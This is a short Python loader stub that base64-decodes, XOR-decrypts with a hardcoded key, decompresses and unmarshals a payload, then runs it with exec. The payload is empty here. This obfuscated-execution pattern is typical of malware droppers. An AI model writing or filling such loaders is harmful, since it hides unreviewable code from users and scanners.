#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import base64, marshal, zlib, sys, os, types

# Anti-tampering: verify we're running as main module
if __name__ != "__main__":
    sys.exit(0)

# Encrypted payload data
_s = "jgZvNcSZu40TCS26zxXrbw=="
_p = ""

# Reconstruct key material
_k1 = b"Gh0st1mag3_S3cur3_K3y_2026"
_k2 = base64.b64decode(_s)
_km = _k1 + _k2

# Decode payload
_d = base64.b64decode(_p)

# Derive XOR key
_kr = (_km * ((len(_d) // len(_km)) + 1))[:len(_d)]

# XOR decrypt
_c = bytes([a ^ b for a, b in zip(_d, _kr)])

# Decompress
_m = zlib.decompress(_c)

# Load bytecode
_b = marshal.loads(_m)

# Execute in a fresh namespace to avoid leaking locals
_ns = {"__name__": "__main__", "__file__": os.path.abspath(__file__)}
exec(_b, _ns)
